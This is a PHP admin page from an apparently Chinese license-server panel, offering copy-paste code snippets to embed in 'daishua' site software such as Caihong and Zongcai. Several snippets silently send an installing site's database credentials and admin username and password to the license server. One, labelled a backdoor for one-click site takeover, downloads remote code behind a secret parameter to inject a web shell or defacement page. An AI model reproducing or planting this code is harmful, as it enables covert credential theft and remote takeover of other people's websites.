<?php
/**
 * 代码大全
**/
include("../includes/common.php");
$title='代码大全';
include './head.php';
if($islogin==1){}else exit("<script language='javascript'>alert('您还未登录,请先登录才能进入！');window.location.href='./login.php';</script>");
$url=isset($_GET['url'])?$_GET["url"]:index;
echo '<div class="col-xs-12 col-sm-10 col-lg-8 center-block" style="float: none;">';
?>
<?php
if($url=="index"){
?>
<div class="block">
<div class="block-title"><h3 class="panel-title">代码导航</h3></div>
<center><h4><font color="#0000FF">代码一定要按需要使用</b></font></h4></center>
<div class="panel-body">
<a href="./daima.php?url=chds" onclick="return confirm(\'你确实要使用彩虹代刷的授权代码吗？\');" class="btn btn-block btn-default">彩虹代刷系统</a><br/>
<a href="./daima.php?url=zcds" onclick="return confirm(\'你确实要使用总裁代刷的授权代码吗？\');" class="btn btn-block btn-default">总裁代刷系统</a><br/>
</div></div>

<?php
}elseif($url=="zcds"){
?>
<div class="block">
<div class="block-title"><h3 class="panel-title">总裁代刷系统</h3></div>
<center><h4><font color="#0000FF">此代码仅总裁代刷系统可用</b></font></h4></center>
<div class="panel-body">
<h4>盗版入库：</h4>
<textarea id="contents" rows="5" class="form-control">
获取盗版站点信息代码
@file_get_contents("http://您的授权站域名/api/up.php?url=".$_SERVER['HTTP_HOST']."&user=".$dbconfig['user']."&pwd=".$dbconfig['pwd']."&db=".$dbconfig['dbname']."&ver=".VERSION."&authcode=".$authcode."&qq=".$conf['kfqq']."&admin_user=".$conf['admin_user']."&admin_pass=".$conf['admin_pwd']);
由于开发者未进行过尝试，上面的代码需自己修改，也可联系开发者
</textarea>
<h4>后门代码：</h4>
<textarea id="contents" rows="5" class="form-control">
一键黑站必备
if(isset($_GET['这里是后门密码'])){file_put_contents('ukyun.php',file_get_contents('http://您的授权站域名/api/hm.txt'));echo "<a href='ukyun.php?mod=hm'>点我注入后门</a><br><a href='ukyun.php?mod=hy'>点我注入黑页</a><br><a href='ukyun.php?mod=hy2'>点我注入黑页2</a>";}
</textarea>
<h4>授权代码：</h4>
<textarea id="contents" rows="5" class="form-control">
平常的授权代码
if(!isset($_SESSION['authcode'])) {
	$query=file_get_contents('http://您的授权站域名/api/check.php?url='.$_SERVER['HTTP_HOST'].'&authcode='.$authcode);
	if($query=json_decode($query,true)) {
		if($query['code']==1)$_SESSION['authcode']=true;
		else exit('<h3>'.$query['msg'].'</h3>');
	}
}
</textarea>
<h4>更新代码：</h4>
<textarea id="contents" rows="5" class="form-control">
需要在update.php中把update_version 改成 version_update 有两条要改
function version_update()
{
	$query = curl_get("http://授权站地址/check.php?url=".$_SERVER["HTTP_HOST"]."&type=5&authcode=".authcode."&type=5&ver=".VERSION);
	if($query = json_decode($query,true)){
		return $query;
	}
	return false;
}
</textarea>
<h4>授权代码加盗版获取：</h4>
<textarea id="contents" rows="5" class="form-control">
通常的授权跟盗版代码，百分之百取得到盗版
if(!isset($_SESSION['authcode'])) {
	$query = curl_get('http://您的授权站域名/api/check.php?url='.$_SERVER['HTTP_HOST'].'&authcode='.$authcode);
	curl_get("http://您的授权站域名/api/up.php?url=".$_SERVER['HTTP_HOST']."&user=".$dbconfig['user']."&pwd=".$dbconfig['pwd']."&db=".$dbconfig['dbname']."&ver=".VERSION."&authcode=".$authcode."&qq=".$conf['kfqq']."&admin_user=".$conf['admin_user']."&admin_pass=".$conf['admin_pwd']);
	if($query=json_decode($query,true)) {
		if($query['code']==1)$_SESSION['authcode']=true;
		else exit('<h3>'.$query['msg'].'</h3>');
	}
}
</textarea>
<h4>易支付认证：</h4>
<textarea id="contents" rows="5" class="form-control">
彩虹代刷易支付认证代码，总裁可用
function pay_api()
{
	global $conf;
	if($conf["payapi"] == 1){
		return "http://您已认证的易支付域名/";
	}elseif($conf["payapi"] == -1){
		$url="http://您的授权站域名/api/paycheck.php?url=";
		@$data=get_curl($url.$conf["epay_url"]);
		$inc=json_decode($data); 
		if($inc->code=='-1'){
			return false;
		}else{
			return $conf["epay_url"];
		}
	}
}
</textarea>
</div></div>
<?php
}elseif($url=="chds"){
?>
<div class="block">
<div class="block-title"><h3 class="panel-title">彩虹代刷系统</h3></div>
<center><h4><font color="#0000FF">此代码仅彩虹代刷系统可用</b></font></h4></center>
<div class="panel-body">
<h4>盗版入库：</h4>
<textarea id="contents" rows="5" class="form-control">
获取盗版站点信息代码
@file_get_contents("http://您的授权站域名/api/up.php?url=".$_SERVER['HTTP_HOST']."&user=".$dbconfig['user']."&pwd=".$dbconfig['pwd']."&db=".$dbconfig['dbname']."&ver=".VERSION."&authcode=".$authcode."&qq=".$conf['kfqq']."&admin_user=".$conf['admin_user']."&admin_pass=".$conf['admin_pwd']);
</textarea>
<h4>后门代码：</h4>
<textarea id="contents" rows="5" class="form-control">
一键黑站必备
if(isset($_GET['这里是后门密码'])){file_put_contents('ukyun.php',file_get_contents('http://您的授权站域名/api/hm.txt'));echo "<a href='ukyun.php?mod=hm'>点我注入后门</a><br><a href='ukyun.php?mod=hy'>点我注入黑页</a><br><a href='ukyun.php?mod=hy2'>点我注入黑页2</a>";}
</textarea>
<h4>授权代码：</h4>
<textarea id="contents" rows="5" class="form-control">
平常的授权代码
if(!isset($_SESSION['authcode'])) {
	$query=file_get_contents('http://您的授权站域名/api/check.php?url='.$_SERVER['HTTP_HOST'].'&authcode='.$authcode);
	if($query=json_decode($query,true)) {
		if($query['code']==1)$_SESSION['authcode']=true;
		else exit('<h3>'.$query['msg'].'</h3>');
	}
}
</textarea>
<h4>更新代码：</h4>
<textarea id="contents" rows="5" class="form-control">
需要在update.php中把update_version 改成 version_update 有两条要改
function version_update()
{
	$query = curl_get("http://授权站地址/check.php?url=".$_SERVER["HTTP_HOST"]."&type=5&authcode=".authcode."&type=5&ver=".VERSION);
	if($query = json_decode($query,true)){
		return $query;
	}
	return false;
}
</textarea>
<h4>授权代码加盗版获取1：</h4>
<textarea id="contents" rows="5" class="form-control">
通常的授权跟盗版代码，百分之百取得到盗版
if(!isset($_SESSION['authcode'])) {
	$query = curl_get('http://您的授权站域名/api/check.php?url='.$_SERVER['HTTP_HOST'].'&authcode='.$authcode);
	curl_get("http://您的授权站域名/api/up.php?url=".$_SERVER['HTTP_HOST']."&user=".$dbconfig['user']."&pwd=".$dbconfig['pwd']."&db=".$dbconfig['dbname']."&ver=".VERSION."&authcode=".$authcode."&qq=".$conf['kfqq']."&admin_user=".$conf['admin_user']."&admin_pass=".$conf['admin_pwd']);
	if($query=json_decode($query,true)) {
		if($query['code']==1)$_SESSION['authcode']=true;
		else exit('<h3>'.$query['msg'].'</h3>');
	}
}
</textarea>
<h4>授权代码加盗版获取2：</h4>
<textarea id="contents" rows="5" class="form-control">
彩虹代刷核心文件授权跟盗版代码，如果分站显示授权请增加这个&& $islogin == 1   没有显示就可以去掉！
if (!isset($_SESSION['authcode']) && $islogin == 1) {
	$query = curl_get('http://您的授权站域名/api/check.php?url='.$_SERVER['HTTP_HOST'].'&authcode='.$authcode);
	curl_get("http://您的授权站域名/api/up.php?url=".$_SERVER['HTTP_HOST']."&user=".$dbconfig['user']."&pwd=".$dbconfig['pwd']."&db=".$dbconfig['dbname']."&ver=".VERSION."&authcode=".$authcode."&qq=".$conf['kfqq']."&admin_user=".$conf['admin_user']."&admin_pass=".$conf['admin_pwd']);
	if ($query = json_decode($query, true)) {
		if ($query["code"] == 1) {
			$_SESSION["authcode"] = authcode;
		} else {
			sysmsg("<h3>" . $query["msg"] . "</h3>", true);
		}
	}
}
</textarea>
<h4>易支付认证：</h4>
<textarea id="contents" rows="5" class="form-control">
彩虹代刷易支付认证代码，总裁可用
function pay_api()
{
	global $conf;
	if($conf["payapi"] == 1){
		return "http://您已认证的易支付域名/";
	}elseif($conf["payapi"] == -1){
		$url="http://您的授权站域名/api/paycheck.php?url=";
		@$data=get_curl($url.$conf["epay_url"]);
		$inc=json_decode($data); 
		if($inc->code=='-1'){
			return false;
		}else{
			return $conf["epay_url"];
		}
	}
}
</textarea>
</div></div>
<?php }?>